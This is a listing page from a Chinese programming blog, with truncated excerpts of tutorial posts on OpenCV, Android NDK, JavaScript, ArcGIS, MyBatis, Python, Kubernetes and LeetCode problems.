<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/11df44eb1ab11fc31b283b6a681a753b/" rel="bookmark">
			Opencv C&#43;&#43; 判断一个点是否在一个矩形内（RECT）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Opencv C++ 判断一个点是否在一个矩形内（RECT） 在这里，线上的点也算在矩形内；
如果不算线上的点，将isPointInRect中判断&lt;= 和&gt;= 都改为&lt; 和&gt;;
// A code C++ // An highlighted block bool isPointInRect(Point P, Rect rect) { Point A = rect.tl(); Point B (rect.tl().x + rect.width , rect.tl().y ) ; Point C(rect.tl().x + rect.width , rect.tl().y + rect.height); Point D(rect.tl().x , rect.tl().y + rect.height ); int x = P.x; int y = P.y; int a = (B.x - A.x)*(y - A.y) - (B.y - A.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/11df44eb1ab11fc31b283b6a681a753b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65173ca45d49dba5ca920e0d17b36243/" rel="bookmark">
			部署ndk环境（废弃）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.从网上获取android-ndk-r20,首先肯定是要有NDK的包，去http://developers.google.cn谷歌的中国官方网站上面去下.然后配置好环境变量
在配置ndk系统环境变量，添加一个变量名“NDK_ROOT”，值为NDK的路径。
在path中新建%NDK_ROOT%
2.在File---Project Structure中配置好ndk的路径
3.在项目名所在的目录下创建一个jni的文件夹,在这个目录里，添加c/c++文件
4.在创建好的jni目录下创建一个Android.mk文件，（就是jni所在路径的makefile）
5.在Android.mk中写如下代码
LOCAL_PATH:=$(call my-dir) include $(CLEAR_VARS) #libtestjni.so //生成so的名字 LOCAL_MODULE := testjni //生成模块的规则，生成的so的名字testjni LOCAL_SRC_FILES := test.cpp //生成模块的规则，so依赖的cpp文件可以有多个 LOCAL_LDLIBS := -llog //生成模块的规则，当前so依赖的so include $(BUILD_SHARED_LIBRARY) //生成尾缀是so的文件 6 修改 项目名app/build.gradle
在这个文件中的 android{}作用域中添加如下代码
sourceSets { main.jniLibs { //表示生产的so文件所在路径在什么位置 source { srcDirs = ['../libs'] } } } externalNativeBuild { ndkBuild { //表示构件androidJNI的Android.mk的所在路径 path '../jni/Android.mk' } } 7.在jni路径下创建一个test.cpp，并随便填充点代码，使用Android studio 中的Terminal命令行进入到jni目录下输入ndk-build.cmd，如果能生产so文件说明cpp编译环境成功。
test.cpp代码
void testJni_Hello() { return; } 8.在目录下面创建一个HelloJNI.java的文件夹，创建相关的函数
使用JNI函数的方式
//调用jni函数的方法 HelloJNI.getInstance().hello_jni(); HlloeJNI.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65173ca45d49dba5ca920e0d17b36243/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a841894b6a6fa8fcbb4aaa21d0da0722/" rel="bookmark">
			winform内调用API
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 /// &lt;summary&gt; /// 调用API接口类 /// &lt;/summary&gt; public static class HttpRequest { //调用接口返回内容 public static string GetFunction(string Url,string Method) { //string serviceAddress = "http://localhost/WebApi/api/OrderInfo/GetOrderInfo"; //示例接口网址 string serviceAddress = Url; HttpWebRequest request = (HttpWebRequest)WebRequest.Create(serviceAddress); request.Method = Method; request.ContentType = "text/html;charset=UTF-8"; HttpWebResponse response = (HttpWebResponse)request.GetResponse(); Stream myResponseStream = response.GetResponseStream(); StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.UTF8); string retString = myStreamReader.ReadToEnd(); myStreamReader.Close(); myResponseStream.Close(); return retString; } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e52c83d5ab5c9eeed5215ed90bca7ddb/" rel="bookmark">
			css 实现跑马灯/走马灯无缝衔接  js实现无缝滚动图片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先上效果图 首先呈上效果图，主要是针对图片跑马灯效果（请忽略我的快速播放和录屏图标）
具体实现方式 目前我需要展示6张图片，但是为了实现无缝衔接，我的列表放了12张（放2遍图片），这样就不至于在切换时出现那么几毫秒的跳动。
&lt;div id="swiper-roll"&gt; &lt;div class="roll-wrapper"&gt; &lt;ul&gt; &lt;li&gt;&lt;img src="./static/img/firm1.png"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./static/img/firm2.png"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./static/img/firm3.png"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./static/img/firm4.png"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./static/img/firm5.png"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./static/img/firm1.png"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./static/img/firm2.png"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./static/img/firm3.png"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./static/img/firm4.png"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="./static/img/firm5.png"&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; //js部分 /** * 无缝滚动，可通过以下两种方式调节滚动速度： * 1、可通过设置iSpeed 大小调节单次滚动速度； * 2、可通过调节timer 定时器中最后一个参数（60）的大小来控制滚动的频率，同时达到调节速度的作用； */ window.onload = function(){ let oDiv=document.getElementById('swiper-roll'); let oUl=oDiv.getElementsByTagName('ul')[0]; let aLi=oUl.getElementsByTagName("li"); let iSpeed=-4; let timer=null; oUl.style.width=aLi[0].offsetWidth*aLi.length+'px'; timer=setInterval(function(){ oUl.style.left=oUl.offsetLeft+iSpeed+'px'; if(oUl.offsetLeft &lt;= -oUl.offsetWidth/2){ oUl.style.left='0px'; } },60); oUl.onmouseover=function(){ clearInterval(timer); } oUl.onmouseout=function(){ timer=setInterval(function(){ oUl.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e52c83d5ab5c9eeed5215ed90bca7ddb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e72f52f841c40c7a2ab8a0123bc5667d/" rel="bookmark">
			ArcGIS分省提取各市、县
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据：全国的矢量边界（省、市、县）
提取各省边界 打开省界的属性表，NAME_1字段是省的名字。
使用“分析工具—&gt;提取分析—&gt;分割”，即可提取。
分割后的各省边界数据
提取各省的市、县边界 由于省界和市、县的边界不完全一致，所以先用市、县边界融合出省界，再分割出市、县。
此处以市为例，县的提取同理。
融合出省界 打开市界的属性表，NAME_1为省所在的字段。
使用“数据管理工具—&gt;制图综合—&gt;融合”工具，即可得到各省边界。
融合后的省界如下
提取市界 使用提取省界时用到的分割工具，用融合后的省界分割全国市界即可。
注意：分割后的文件直接以分割字段的值命名，建议将省、市、县放置不同的文件夹或数据库进行分割提取。
分割后安徽省各市如下图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01e1562a385e982c234e9cbaa6634617/" rel="bookmark">
			default(Nullable(type)) vs default(type)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		default(Nullable&lt;long&gt;) == null default(long?) == null default(long) == 0L 转载于:https://www.cnblogs.com/dayang12525/p/11636695.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb18e5185fcd8e9ef12354e7d29c25e6/" rel="bookmark">
			【共享中间件】知识点杂记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、`@TargetDataSource`2、`mybaits中，setting的的配置参数如下(如果不在配置文件中配置将使用默认值)`3、`@WebFilter`4、java中可以让程序暂停几秒执行的代码 `Thread.sleep (1000);//停留1秒`5、MySQL 中 BETWEEN AND 的边界是左闭右闭6、xml文件中的小于号的问题6、MySQL时间 1、@TargetDataSource 基于springboot开箱即用的多数据源动态调整插件，在service层使用注解@TargetDataSource(“ds1”)可以直接切换数据源，如果不使用，调用默认配置的数据源
2、mybaits中，setting的的配置参数如下(如果不在配置文件中配置将使用默认值) 设置参数 描述 有效值 默认值 cacheEnabled 该配置影响的所有映射器中配置的缓存的全局开关 true | false true lazyLoadingEnabled 延迟加载的全局开关。当开启时，所有关联对象都会延迟加载。 特定关联关系中可通过设置fetchType属性来覆盖该项的开关状态 true | false false aggressiveLazyLoading 当启用时，对任意延迟属性的调用会使带有延迟加载属性的对象完整加载；反之，每种属性将会按需加载。 true | false true multipleResultSetsEnabled 是否允许单一语句返回多结果集（需要兼容驱动）。 true | false true useColumnLabel 使用列标签代替列名。不同的驱动在这方面会有不同的表现， 具体可参考相关驱动文档或通过测试这两种不同的模式来观察所用驱动的结果。 true | false true useGeneratedKeys 允许 JDBC 支持自动生成主键，需要驱动兼容。 如果设置为 true 则这个设置强制使用自动生成主键，尽管一些驱动不能兼容但仍可正常工作（比如 Derby）。 true | false False autoMappingBehavior 指定 MyBatis 应如何自动映射列到字段或属性。 NONE 表示取消自动映射；PARTIAL 只会自动映射没有定义嵌套结果集映射的结果集。 FULL 会自动映射任意复杂的结果集（无论是否嵌套）。 NONE, PARTIAL, FULL PARTIAL defaultExecutorType 配置默认的执行器。SIMPLE 就是普通的执行器；REUSE 执行器会重用预处理语句（prepared statements）； BATCH 执行器将重用语句并执行批量更新。 SIMPLE REUSE BATCH SIMPLE defaultStatementTimeout 设置超时时间，它决定驱动等待数据库响应的秒数。 Any positive integer Not Set (null) defaultFetchSize Sets the driver a hint as to control fetching size for return results.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb18e5185fcd8e9ef12354e7d29c25e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f4e6938c502dcccf86c8b0e8944ac22/" rel="bookmark">
			Arcpy批量裁剪（掩膜方法矢量裁剪栅格）（1个shp，多个raster文件）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		# 当需要用一个shp文件裁剪多个raster情况，如：对需要广东省每天的MODIS数据时
数据准备：单个shp文件以及若干raster文件
语法 ExtractByMask (in_raster, in_mask_data)
# -*- coding: utf-8 -*- import arcpy from arcpy import env from arcpy.sa import * # Set environment settings env.workspace = "D:/MODIS/M/13Q1" outputpath="D:/MODIS/M/clip" # Set local variables rasters = arcpy.ListRasters("*", "tif") inMaskData = "D:/Nercita/songxy/MODIS/M/shp/Guangdong.shp" for raster in rasters: #去掉后缀和文件名中的'.' file_name = raster.split('.')[0]+raster.split('.')[1]+raster.split('.')[2] print(file_name) # Check out the ArcGIS Spatial Analyst extension license arcpy.CheckOutExtension("Spatial") # Execute ExtractByMask outExtractByMask = ExtractByMask(raster, inMaskData) # Save the output outExtractByMask.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f4e6938c502dcccf86c8b0e8944ac22/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce64d89090578fd6097244b308002ed2/" rel="bookmark">
			说说Python中的类型转换有哪些？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		公众号新增加了一个栏目，就是每天给大家解答一道Python常见的面试题，反正每天不贪多，一天一题，正好合适，只希望这个面试栏目，给那些正在准备面试的同学，提供一点点帮助！
小猿会从最基础的面试题开始，每天一题。如果参考答案不够好，或者有错误的话，麻烦大家可以在留言区给出自己的意见和讨论，大家是要一起学习的 。
废话不多说，开始今天的题目：
问：说说Python中的类型转换有哪些？
答：在Python处理数据时，不可避免的要使用数据类型之间的转换。简单的诸如int、float、string之间的转换；更有数组array、列表list之间的转换。
以下是几个内置的函数可以执行数据类型之间的转换。这些函数返回一个新的对象，表示转换的值。
函数描述int(x [,base])
将x转换为一个整数
long(x [,base] )
将x转换为一个长整数
float(x)
将x转换到一个浮点数
complex(real [,imag])
创建一个复数
str(x)
将对象 x 转换为字符串
repr(x)
将对象 x 转换为表达式字符串
eval(str)
用来计算在字符串中的有效Python表达式,并返回一个对象
tuple(s)
将序列 s 转换为一个元组
list(s)
将序列 s 转换为一个列表
set(s)
转换为可变集合
dict(d)
创建一个字典。d 必须是一个序列 (key,value)元组。
frozenset(s)
转换为不可变集合
chr(x)
将一个整数转换为一个字符
unichr(x)
将一个整数转换为Unicode字符
ord(x)
将一个字符转换为它的整数值
hex(x)
将一个整数转换为一个十六进制字符串
oct(x)
将一个整数转换为一个八进制字符串
这篇没有给出具体的代码，因为实在是太长了，大家可以看下面的链接：史上最全的 Python 3 类型转换指南 。ps:公众号不允许跳转外链，大家可以点文末的"阅读原文"跳转 。
https://www.cxyquan.com/5935.html
如果对于参考答案有不认同的，大家可以在评论区指出和补充，欢迎留言！
更多题目：
关注小猿公众号，每天学习一道题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a381554cc6ba10fb6e4d5a43fbb01abc/" rel="bookmark">
			双向链表封装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		//双向链表 function DoubleLinkedList() { function Node(value) { this.value = value this.next = null this.prev = null } //链表头节点 this.head = null //链表尾节点 this.fail = null //链表长度 this.length = 0 //在链表尾部添加元素 DoubleLinkedList.prototype.append = function (value) { var newElement = new Node(value) if (!this.head) { this.head = newElement this.fail = newElement } else { var current = this.fail while (current.next) { current = current.next } newElement.prev = current current.next = newElement this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a381554cc6ba10fb6e4d5a43fbb01abc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddc67aceb2290daeadf5259545208be1/" rel="bookmark">
			Mac下命令行下  报  env: bash\r: No such file or directory
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我是从window下拷贝的 react-native 项目执行 react-native run-android 时候报 env: bash\r: No such file or directory
解决办法：
1、brew install dos2unix 2、find . -type f -exec dos2unix {} \; 第二步的分号前有个\
具体解释看下面两篇博客：
关于unix和window符号的总是
如何转换符号
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d935efb1cf4c422ef4a6e9a780b2b50/" rel="bookmark">
			【nodejs】events模块--EventEmitter类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		events模块中的EventEmitter类主要是用来进行事件的监听与绑定哒
举例说明，我们先实例化一个EventEmitter
var events = require('events'); var eEmitter = events.EventEmitter(); 1.eEmitter.on(‘事件名称’,function(){},function(){}…)
该方法是用来绑定事件，其中第一个参数是所绑定事件的名称，后面的参数指的是事件被触发后需要执行的方法，排在前面的函数先被触发。
2.eEmitter.emit(‘事件名称’)
该方法用来触发事件，只有事件被触发，应用程序才会执行事件。
3.具体实例分析
// 引入 events 模块 var events = require('events'); // 创建 eventEmitter 对象 var eventEmitter = new events.EventEmitter(); // 创建事件处理程序，就是下面事件名称为‘connection’需要执行的内容 var connectHandler = function connected() { console.log('我连接啦~'); // 触发 data_received 事件 eventEmitter.emit('data_received'); } // 绑定 connection 事件处理程序 eventEmitter.on('connection', connectHandler); // 使用匿名函数绑定 data_received 事件 eventEmitter.on('data_received', function(){ console.log('我收到数据啦~'); }); // 触发 connection 事件 eventEmitter.emit('connection'); console.log("ok啦各位。"); 控制台输出顺序是：
我连接啦~ 我收到数据啦~ ok啦各位。 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d935efb1cf4c422ef4a6e9a780b2b50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2dde5f59343050dee1168d97a4a27ced/" rel="bookmark">
			Python3正则表达式之贪婪模式与非贪婪模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 正则表达式是一个特殊字符序列，主要是帮助用户检索一个字符串是否与某种模式匹配或者在txt文档中检测匹配的字符串序列，然后将删除或者替换，在日常变种中我们也经常会进行字符查找和替换，这些的实现就是通过正则表达式提供的。关于正则表达式的使用，可以参考https://blog.csdn.net/m0_37852369/article/details/78829174和https://blog.csdn.net/m0_37852369/article/details/78838498。此处我主要介绍一下自己的见解并且作为学习过程的一个记录。
1.何为贪婪？何为非贪婪？ 在Python语言和大多数程序语言的数量词默认是贪婪的（少量默认非贪婪），贪婪模式总是尝试匹配尽可能多的字符，而非贪婪模式刚好相反，其总是尝试匹配尽可能烧得字符。
具体看下面的例子：
import re string = 'abbbc' pattern_greed = re.compile('\w+') pattern_nogreed = re.compile('\w+?') pg = pattern_greed.match(string) pn = pattern_nogreed.match(string) print(pg.group()) print(pn.group()) 输出结果为：
贪婪模式输出结果为： abbbc 非贪婪模式输出结果为： a 可以看出，在不加“？”的情况下输出最大匹配项，即为贪婪模式，而加了“？”的时候，输出为a为最小匹配项。
2.使用方法 在python语言中默认贪婪模式，要使用非贪婪模式则需加“？”，下表是常用的几种正则表达式符号：
符号
含义\d匹配一个数字字符\w匹配包括下划线的任意单词字符+前一个字符至少出现一次*前一个字符出现次数大于等于零次（可出现无数次，也可不出现）？非贪婪模式标志，进行最小匹配（配合+，*使用），前一个字符出现0次或1次{m}前一个字符出现m次{m, n}前一个字符出现至少m次，至多n次 3.分析 下面具体讲一下上面例子的结果：
贪婪模式：正则表达式为"\w+"，即包括下划线的任意单词字符出现至少一次或多次，因为是贪婪匹配，会尽可能的匹配，因而结果就为abbbc，其都是单词字符，再看下面的例子：
import re string = 'abbbc' pattern_greed = re.compile('ab+') pg = pattern_greed.match(string) print('贪婪模式输出结果为：', pg.group()) 结果为：
贪婪模式输出结果为： abbb 这个正则表达式'+'的前一个字符为b，则b出现至少一次或无穷次，在贪婪模式下，在'abbbc'中匹配'ab'的最大项即为'abbb'，与输出结果相同。
非贪婪模式：在第一个例子中正则表达式为"\w+?"，'\w'表示包括下划线的任意单词字符出现至少一次或多次，又'?'表示为非贪婪模式，因而会去尽可能匹配最小的项，得到最终结果'a'。再看下面的例子：
import re string = 'abbbc' pattern_nogreed = re.compile('ab+?') pn = pattern_nogreed.match(string) print('非贪婪模式输出结果为：', pn.group()) 输出结果：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2dde5f59343050dee1168d97a4a27ced/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dec3666a4664dfaabec9e744e8862556/" rel="bookmark">
			1079. 活字印刷
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		你有一套活字字模 tiles，其中每个字模上都刻有一个字母 tiles[i]。返回你可以印出的非空字母序列的数目。
示例 1：
输入："AAB"
输出：8
解释：可能的序列为 "A", "B", "AA", "AB", "BA", "AAB", "ABA", "BAA"。
示例 2：
输入："AAABBC"
输出：188
提示：
1 &lt;= tiles.length &lt;= 7
tiles 由大写英文字母组成
来源：力扣（LeetCode）
链接：https://leetcode-cn.com/problems/letter-tile-possibilities
著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。
和90.子集II一类题，难点在于如何保证结果不重复。
1 public class Solution { 2 private char[] titles = null; 3 private int count = 0; 4 private boolean[] flag = null; 5 private int len = -1; 6 7 private void helper(){ 8 9 for (int i = 0; i &lt; len; i++) { 10 if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dec3666a4664dfaabec9e744e8862556/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57b08d0c1cf510a8d90b18d7e06a02d5/" rel="bookmark">
			Kubernetes StatefulSet
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		StatefulSet 简介 在Kubernetes中,Pod的管理对象RC、Deployment、DaemonSet和Job都是面向无状态的服务。但现实中有很多服务是有状态的,特别是一些复杂的中间件集群,例如MySQL集群、MongoDB集群、Akka集群、ZooKeeper集群等。
以上集群有几个共同点： 1.每个节点都有固定的身份ID,通过这个ID,集群中的成员可以互相发现并且通信 2.集群的规模是比较固定的,集群规模不能随意变动。 3.集群里的每个节点都是有状态的,通常会持久化数据到永久存储中 4.如果磁盘损坏,则集群里的某个节点无法正常运行,集群功能受损。
如果用RC/Deployment 控制Pod 副本数的方式来实现上述有状态的集群,则我们会发现第一点是无法满足的,因为Pod的名字是随机产生的,Pod的IP地址也是在运行期才确定且可能有变动的,我们事先无法为每个Pod确定唯一不变的ID。另外,为了能够在其他节点上恢复某个失败的节点,这种集群中的Pod 需要挂载某种共享存储,Kubernetes在1.4版本引入了PetSet这个新资源对象,在1.5更名为"StatefulSet"。StatefulSet 从本质来将,可以看作Deployment/RC 的一种特殊变种
StatefulSet 特点 StatefulSet特点：
1.StatefulSet 里的每个Pod都有稳定、唯一的网络表示,可以用来发现集群内的其他成员。(假设StatefulSet 的名字叫kafka,那么第一个Pod叫kafka-0,第二个Pod叫kafka-1以此类推) 2.StatefulSet 控制的Pod副本的启动顺序是受控制的,操作第n个Pod,前n-1个Pod已经是运行且准备好的状态 3.StatefulSet 里的Pod采用稳定的持久化存储卷,通过PV/PVC来实现,删除Pod时默认不会删除与StatefulSet相关的存储卷(为了保证数据的安全)
StatefulSet是为了解决有状态服务的问题（对应Deployment和Replica Set是为无状态服务而设计），其应用场景包括
稳定的持久化存储，即Pod重新调度后还是能访问到相同的持久化数据，基于PVC来实现稳定的网络标志，即Pod重新调度后其PodName和HostName不变，基于Headless Service（即没有Cluster IP的Service）来实现有序部署，有序扩展，即Pod是有顺序的，在部署或者扩展的时候要依据定义的顺序依次依次进行（即从0到N-1，在下一个Pod运行之前所有之前的Pod必须都是Running和Ready状态），基于init containers来实现有序收缩，有序删除（即从N-1到0 从上面的应用场景可以发现，StatefulSet由以下几个部分组成：
用于定义网络标志（DNS domain）的Headless Service用于创建PersistentVolumes的volumeClaimTemplates定义具体应用的StatefulSet StatefulSet 原理 StatefulSet由Service和volumeClaimTemplates组成。Service中的多个Pod将会被分别编号，并挂载volumeClaimTemplates中声明的PV。
注意： 官方提示StatefulSets在1.9中是稳定的
案例：K8s企业实践使用storageclass实现动态存储
StatefulSet 除了要与PV卷捆绑使用以存储Pod的状态数据,还要与Headless Service配合使用,在每个StatfulSet的定义中要声明它属于哪个Headless Service.Headless Service 与普通Service的关键区别在于, Headless Service它没有Cluster IP,如果解析Headless Service的DNS域名,则返回的是该Service对应的全部Pod的Endpoint列表。
StatefulSet在Headless Service的基础上又为StatefulSet控制的每个Pod实力创建了一个DNS域名,这个域名的格式为： ${podname}.${headless service name}
比如一个3节点的Kafka的StatefulSet集群,对应的Headless Service的名字为kafka,StatefulSet的名字为kafka,则StatefulSet 里面的3个Pod的DNS分别为kafka-0.kafka、kafka-1.kafka、kafka-3.kafka,这些DNS名称可以直接在集群的配置文件中固定下来。
简单点说：没有部署HeadlessService的话，PetSet/StatefulSet下的pod，无法通过域名进行访问。
实例演示 官方演示地址 首先使用以下示例创建StatefulSet以一个简单的nginx服务web.yaml为例
StatefulSet注意事项
还在beta状态，需要kubernetes v1.5版本以上才支持所有Pod的Volume必须使用PersistentVolume或者是管理员事先创建好为了保证数据安全，删除StatefulSet时不会删除VolumeStatefulSet需要一个Headless Service来定义DNS domain，需要在StatefulSet之前创建好目前StatefulSet还没有feature complete，比如更新操作还需要手动patch。 案例开始
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57b08d0c1cf510a8d90b18d7e06a02d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f433ed0a1eb45cc3d797c58cad01870/" rel="bookmark">
			mysql_query(&#34;set names &#39;utf8&#39;&#34;);
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		把mysql_query("set names 'utf8'");放在操作数据库之前，基本可以解决编码问题。（数据库用UTF-8编码） 转载于:https://www.cnblogs.com/justforfun/archive/2009/04/27/1444351.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f55dced01407d09d1b67ecbc94c9f5b/" rel="bookmark">
			842. 将数组拆分成斐波那契序列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定一个数字字符串 S，比如 S = "123456579"，我们可以将它分成斐波那契式的序列 [123, 456, 579]。
形式上，斐波那契式序列是一个非负整数列表 F，且满足：
0 &lt;= F[i] &lt;= 2^31 - 1，（也就是说，每个整数都符合 32 位有符号整数类型）；
F.length &gt;= 3；
对于所有的0 &lt;= i &lt; F.length - 2，都有 F[i] + F[i+1] = F[i+2] 成立。
另外，请注意，将字符串拆分成小块时，每个块的数字一定不要以零开头，除非这个块是数字 0 本身。
返回从 S 拆分出来的所有斐波那契式的序列块，如果不能拆分则返回 []。
示例 1：
输入："123456579"
输出：[123,456,579]
示例 2：
输入: "11235813"
输出: [1,1,2,3,5,8,13]
示例 3：
输入: "112358130"
输出: []
解释: 这项任务无法完成。
示例 4：
输入："0123"
输出：[]
解释：每个块的数字不能以零开头，因此 "01"，"2"，"3" 不是有效答案。
示例 5：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f55dced01407d09d1b67ecbc94c9f5b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b092f591d1ded576f302df67ced72586/" rel="bookmark">
			【Java面试题】字符串排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【题目】：
输入一个字符串,按字典序打印出该字符串中字符的所有排列。例如输入字符串abc,则打印出由字符a,b,c所能排列出来的所有字符串abc,acb,bac,bca,cab和cba。
输入一个字符串,长度不超过9(可能有字符重复),字符只包括大小写字母。
【示例】：
例如输入字符串abc,则打印出由字符a,b,c所能排列出来的所有字符串abc,acb,bac,bca,cab和cba。
【关键点】： 字符串,回溯
回溯的基本思想
【Java】：
import java.util.ArrayList; import java.util.Collections;// public class Solution { public ArrayList&lt;String&gt; Permutation(String str) { StringBuilder sb = new StringBuilder(str);//string不可变，StringBuilder可变 ArrayList&lt;String&gt; result = new ArrayList&lt;String&gt;(); if(sb.length() == 1)result.add(sb.toString()); else{ for(int i = 0; i &lt; sb.length(); i++){ if(i== 0 || sb.charAt(i) != sb.charAt(0)){//字符不重复 char temp = sb.charAt(i);//获取第i个字符的内容 sb.setCharAt(i, sb.charAt(0));//前两个数交换:a和b交换， sb.setCharAt(0, temp); ArrayList&lt;String&gt; newResult = Permutation(new String(sb.substring(1)));//切去a，递归当前字符为bc for(int j =0; j &lt; newResult.size(); j++){ result.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b092f591d1ded576f302df67ced72586/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5e546dd2eb0351f813d63d1b39dbc48/" rel="bookmark">
			tsconfig.json
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
